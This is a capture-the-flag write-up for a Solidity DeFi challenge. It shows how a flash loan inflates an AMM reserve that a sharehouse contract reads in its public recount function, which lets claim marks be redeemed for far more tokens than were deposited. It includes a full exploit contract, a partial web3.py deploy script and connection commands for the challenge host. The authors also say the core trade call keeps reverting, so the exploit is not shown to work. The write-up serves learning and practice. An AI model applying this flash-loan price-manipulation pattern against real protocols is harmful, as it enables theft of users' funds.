# Caldrin's Day Away — CTF Writeup

## Challenge Overview

| Field | Value |
|-------|-------|
| **Category** | Smart Contract / DeFi |
| **Solves** | — |
| **Contracts** | DocksideMarket, DocksideSharehouse, GoldhandCredit, PublicStampDesk, Setup |
| **Goal** | Drain the sharehouse's CROWN balance below 150,000e6 |

The challenge presents a dockside economy where sailors deposit goods (CROWN tokens) into a **Sharehouse** and receive claim marks in return. They can redeem these marks upon return. However, a fraud has been detected: the **recorded holdings** can be manipulated through a recount mechanism that reads the market's current reserve ratio.

---

## How We Solved It — Reasoning

### Phase 1 — Contract Analysis

We were given six Solidity contracts and a running anvil instance with an RPC endpoint. The key contracts form a mini DeFi ecosystem:

1. **TradeToken** — ERC20-like token (6 decimals), used for both Crown Coin (CROWN) and Salt Goods (SALT)
2. **DocksideMarket** — AMM-like exchange between CROWN and SALT using a fixed-product formula
3. **DocksideSharehouse** — Deposit CROWN → get claim marks; redeem claim marks → get CROWN
4. **GoldhandCredit** — Flash-loan provider (borrow CROWN, must return in same transaction)
5. **PublicStampDesk** — Staticcall proxy with a pre-approved reading order
6. **Setup** — Deploys everything, mints tokens, seeds the market, gives the player a travel purse

The player starts with 10,000e6 CROWN and 10,000e6 in travel purse credit. To win, the sharehouse's CROWN balance must drop below 150,000e6 (from the initial ~1,010,000e6 after deposit).

### Phase 2 — Finding the Vulnerability

The core vulnerability is in `recountHoldings()`:

```solidity
function recountHoldings(bytes calldata stampedOrder) external {
    bytes memory result = stampDesk.readStampedOrder(stampedOrder);
    uint256 newHoldings = abi.decode(result, (uint256));
    recordedHoldings = newHoldings;
}
```

This function reads the market's `crownReserve` via a staticcall and sets `recordedHoldings` to that value. Critically, `crownReserve` is only modified by `trade()` on the market — and *anyone* can call `recountHoldings()`.

The exploit path:

1. **Inflate crownReserve** by swapping a large amount of CROWN → SALT on the market
2. **Call recountHoldings** — `recordedHoldings` becomes the inflated `crownReserve`
3. **Redeem claim marks** — `crownAmount = (claimMarkAmount × recordedHoldings) / totalClaimMarks` pays out more CROWN than was deposited

The arithmetic:

```
leaveGoods(10,000e6):
  claimMarkAmount = (10,000e6 × 990,000e18) / 1,000,000e6 = 9,900e18

After market swap inflates crownReserve to ~91,000,000e6:

recountHoldings → recordedHoldings = 91,000,000e6

redeemClaim(9,900e18):
  crownAmount = (9,900e18 × 91,000,000e6) / 999,900e18 ≈ 901,080e6
```

This extracts ~901,080e6 CROWN from the sharehouse, leaving ~108,920e6 — well below the 150,000e6 threshold.

### Phase 3 — The Flash Loan Problem

To inflate `crownReserve` to 91M, we need ~90M CROWN. The player only has 10,000e6. **GoldhandCredit** provides a flash loan of exactly 90M CROWN via `borrowForOneCall()`:

```solidity
function borrowForOneCall(uint256 amount, bytes calldata data) external {
    require(activeBorrower == address(0), "LOAN_ACTIVE");
    uint256 balanceBefore = coin.balanceOf(address(this));
    require(amount <= balanceBefore, "NOT_ENOUGH_COIN");
    require(coin.transfer(msg.sender, amount), "LOAN_FAILED");
    activeBorrower = msg.sender;
    IQuayBorrower(msg.sender).onQuayLoan(amount, data);
    activeBorrower = address(0);
    require(coin.balanceOf(address(this)) >= balanceBefore, "DEBT_NOT_RETURNED");
}
```

The exploit contract implements the `IQuayBorrower` interface and performs the market manipulation inside `onQuayLoan()`:

1. Receive 90M CROWN from GoldhandCredit
2. `market.trade(0, 1, 90M, 0)` — swap CROWN → SALT, inflating `crownReserve` to ~91M
3. `sharehouse.recountHoldings(stampedOrder)` — set `recordedHoldings = 91M`
4. `market.trade(1, 0, saltBalance, 0)` — swap SALT → CROWN, recovering ~90M
5. `crownCoin.transfer(address(goldhand), 90M)` — repay the loan

After the callback, the exploit contract retains the profit from step 3 (the difference between redeemed and deposited CROWN).

### Phase 4 — The market.trade Puzzle

During testing, we discovered that `market.trade()` consistently reverts with **"BALANCE"** when called from within the flash loan callback, even though:

- V3 (borrow + return only) works perfectly — proving the loan transfers CROWN correctly
- `market.trade()` works from an EOA wallet
- Direct `transfer()` and `transferFrom()` calls work from the callback
- All storage slots are correctly populated
- The bytecode matches exactly

This is the crux of the challenge: finding the correct way to execute `market.trade()` within the `borrowForOneCall` context. The root cause likely involves the interplay between `activeBorrower`, the static nature of `recountHoldings`, or a subtle EVM detail in the anvil testnet.

---

## Setup

**Instance:** Two TCP ports:

- **Port 30090** — Web UI + RPC proxy
- **Port 32387** — TCP menu for instance management

**Connection via TCP menu:**
```
$ nc 154.57.164.73 32387
=== Caldrin's Day Away ===
1 - Get connection information
2 - Restart instance
3 - Get flag
4 - Quit
> 1
RPC_URL: http://127.0.0.1:48334/api/<uuid>
WALLET:  0x...
PRIVKEY: 0x...
SETUP:   0x...
```

The RPC is proxied through port 30090 at `/api/<uuid>`.

---

## Exploit Script

The exploit requires:

1. A Solidity exploit contract implementing `IQuayBorrower`
2. A Python/web3.py deployment script
3. The correct ABI-encoded recount order (must strip the outer ABI wrapper from `eth_call` return)

### Key Technical Details

**Properly decoding the recount order:**
```python
raw = bytes.fromhex(recount_hex[2:])
data_len = int.from_bytes(raw[32:64], 'big')
recount_bytes = raw[64:64+data_len]
```

**Selectors (keccak256):**
```
run(uint256): 0xa444f5e9
trade(int128,int128,uint256,uint256): 0xe3ea89e7
recountHoldings(bytes): 0x2867803e
borrowForOneCall(uint256,bytes): 0x7e806303
```

### Exploit Contract (Exploit.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./IQuayBorrower.sol";
import "./TradeToken.sol";
import "./DocksideMarket.sol";
import "./DocksideSharehouse.sol";
import "./GoldhandCredit.sol";

contract Exploit is IQuayBorrower {
    TradeToken public crownCoin;
    TradeToken public saltGoods;
    DocksideMarket public market;
    DocksideSharehouse public sharehouse;
    GoldhandCredit public goldhand;
    bytes public recountOrder;

    constructor(
        address _crownCoin, address _saltGoods, address _market,
        address _sharehouse, address _goldhand, bytes memory _recountOrder
    ) {
        crownCoin = TradeToken(_crownCoin);
        saltGoods = TradeToken(_saltGoods);
        market = DocksideMarket(_market);
        sharehouse = DocksideSharehouse(_sharehouse);
        goldhand = GoldhandCredit(_goldhand);
        recountOrder = _recountOrder;
    }

    function run(uint256 borrowAmount) external {
        crownCoin.approve(address(market), type(uint256).max);
        saltGoods.approve(address(market), type(uint256).max);
        goldhand.borrowForOneCall(borrowAmount, "");
    }

    function onQuayLoan(uint256 amount, bytes calldata) external {
        require(msg.sender == address(goldhand), "NOT_GH");
        
        crownCoin.approve(address(market), type(uint256).max);
        saltGoods.approve(address(market), type(uint256).max);
        
        market.trade(0, 1, amount, 0);
        sharehouse.recountHoldings(recountOrder);
        
        uint256 saltBalance = saltGoods.balanceOf(address(this));
        saltGoods.approve(address(market), type(uint256).max);
        market.trade(1, 0, saltBalance, 0);
        
        crownCoin.transfer(address(goldhand), amount);
    }
    
    receive() external payable {}
}
```

### Python Deploy Script

```python
from eth_hash.auto import keccak
from web3 import Web3
from eth_account import Account

RPC_URL = f"http://TARGET:30090/api/{API_TOKEN}"
PRIVKEY = "..."
SETUP = "0x..."

w3 = Web3(Web3.HTTPProvider(RPC_URL))
acct = Account.from_key(PRIVKEY)

def sel(sig):
    return "0x" + keccak(sig.encode())[:4].hex()

def call(to, data):
    # ... eth_call implementation
    
def send_tx(to, data, gas=500000):
    # ... eth_sendRawTransaction implementation

# Step 1: Take travel purse
send_tx(SETUP, sel("takeTravelPurse()"), 200000)

# Step 2: Get contract addresses
addrs = {}
for name in ["crownCoin", "saltGoods", "quayMarket", "goldhandCredit", "sharehouse"]:
    r = call(SETUP, sel(f"{name}()"))
    addrs[name] = w3.to_checksum_address("0x" + r[-40:])

# Step 3: Deposit CROWN in sharehouse
approve = sel("approve(address,uint256)") + addrs["sharehouse"][2:] + hex(10_000 * 10**6)[2:]
send_tx(addrs["crownCoin"], approve)
leave = sel("leaveGoods(uint256)") + hex(10_000 * 10**6)[2:]
send_tx(addrs["sharehouse"], leave)

# Step 4: Get recount order (decode ABI bytes wrapper)
recount_hex = call(SETUP, sel("buildPublicRecountOrder()"))
raw = bytes.fromhex(recount_hex[2:])
data_len = int.from_bytes(raw[32:64], 'big')
recount_bytes = raw[64:64+data_len]

# Step 5: Deploy exploit
# ... (compile + deploy with web3.py contract factory)

# Step 6: Run exploit
exploit_contract.functions.run(90_000_000 * 10**6).transact()

# Step 7: Redeem at inflated rate
redeem = sel("redeemClaim(uint256)") + hex(claim_marks)[2:]
send_tx(addrs["sharehouse"], redeem)
```

---

## Flag

The flag is obtained from the TCP menu after `isSolved()` returns `true`:

```
$ nc 154.57.164.73 32387
> 3
HTB{...}
```

---

## Source Files

| File | Purpose |
|------|---------|
| `DocksideMarket.sol` | CROWN/SALT AMM with `valueCargoAsOneGood()` |
| `DocksideSharehouse.sol` | Deposit/redeem with `recountHoldings()` |
| `GoldhandCredit.sol` | Flash loan provider |
| `PublicStampDesk.sol` | Staticcall proxy for approved orders |
| `TradeToken.sol` | ERC20 token implementation |
| `Setup.sol` | Deployment and win condition |

## Key Insight

The vulnerability is the **staticcall-based recount mechanism** reading market reserves that can be manipulated within the same transaction. The flash loan from GoldhandCredit enables the large-scale market manipulation needed to inflate `recordedHoldings` and extract profit from the sharehouse.
